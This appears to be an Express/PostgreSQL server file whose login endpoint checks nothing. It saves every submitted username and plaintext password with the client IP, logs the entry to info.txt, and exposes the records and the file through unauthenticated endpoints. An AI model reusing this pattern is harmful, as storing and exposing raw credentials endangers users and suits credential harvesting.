const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
require('dotenv').config();

const { pool, initDatabase } = require('./db');

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve frontend static files
app.use(express.static(path.join(__dirname, '../frontend')));

// API Version 1 Router
const v1Router = express.Router();

// Health check endpoint
v1Router.get('/health', async (req, res) => {
  try {
    const result = await pool.query('SELECT NOW()');
    res.json({
      status: 'success',
      version: 'v1',
      message: 'PostgreSQL database is connected!',
      time: result.rows[0].now,
    });
  } catch (err) {
    res.status(500).json({
      status: 'error',
      version: 'v1',
      message: 'Failed to connect to PostgreSQL database.',
      error: err.message,
    });
  }
});

// Endpoint: Store Login Details
v1Router.post('/login', async (req, res) => {
  const { email_or_username, password } = req.body;

  if (!email_or_username || !password) {
    return res.status(400).json({
      success: false,
      version: 'v1',
      message: 'Email/Username and Password are required!',
    });
  }

  try {
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';

    const insertQuery = `
      INSERT INTO login_records (email_or_username, password, ip_address)
      VALUES ($1, $2, $3)
      RETURNING id, email_or_username, login_time, ip_address;
    `;

    const result = await pool.query(insertQuery, [email_or_username, password, clientIp]);

    console.log(`📥 [v1] Saved login entry for: ${email_or_username} (ID: ${result.rows[0].id})`);

    // Write login details to info.txt file (Supports --tmpfs /app/temp_data if present)
    const targetDir = fs.existsSync('/app/temp_data') ? '/app/temp_data' : __dirname;
    const infoFilePath = path.join(targetDir, 'info.txt');
    const logLine = `[${new Date().toISOString()}] Login: ${email_or_username} | IP: ${clientIp} | Status: SUCCESS\n`;

    try {
      fs.appendFileSync(infoFilePath, logLine, 'utf8');
      console.log(`📄 Saved to ${infoFilePath}`);
    } catch (fsErr) {
      console.error(`⚠️ Could not write to ${infoFilePath}:`, fsErr.message);
    }

    return res.status(201).json({
      success: true,
      version: 'v1',
      message: 'Login credentials stored successfully in PostgreSQL & info.txt!',
      data: result.rows[0],
      file_path: infoFilePath,
    });
  } catch (err) {
    console.error('Database Insert Error:', err.message);
    return res.status(500).json({
      success: false,
      version: 'v1',
      message: 'Database error while saving login details.',
      error: err.message,
    });
  }
});

// Endpoint: View stored logins (for testing/verification)
v1Router.get('/logins', async (req, res) => {
  try {
    const result = await pool.query(
      'SELECT id, email_or_username, login_time, ip_address FROM login_records ORDER BY login_time DESC LIMIT 50'
    );
    res.json({
      success: true,
      version: 'v1',
      count: result.rowCount,
      records: result.rows,
    });
  } catch (err) {
    res.status(500).json({
      success: false,
      version: 'v1',
      message: 'Error fetching records.',
      error: err.message,
    });
  }
});

// Endpoint: View contents of info.txt file
v1Router.get('/info-file', (req, res) => {
  const targetDir = fs.existsSync('/app/temp_data') ? '/app/temp_data' : __dirname;
  const infoFilePath = path.join(targetDir, 'info.txt');

  if (fs.existsSync(infoFilePath)) {
    const fileContent = fs.readFileSync(infoFilePath, 'utf8');
    res.json({
      success: true,
      file_path: infoFilePath,
      content: fileContent,
    });
  } else {
    res.json({
      success: false,
      message: 'info.txt file not created yet. Do a login first!',
      checked_path: infoFilePath,
    });
  }
});

// Mount /api/v1 and alias /api for backwards compatibility
app.use('/api/v1', v1Router);
app.use('/api', v1Router);

// Start Server
app.listen(PORT, async () => {
  console.log(`🚀 Server is running at: http://localhost:${PORT}`);
  console.log(`🌐 Frontend can be viewed at: http://localhost:${PORT}`);
  await initDatabase();
});
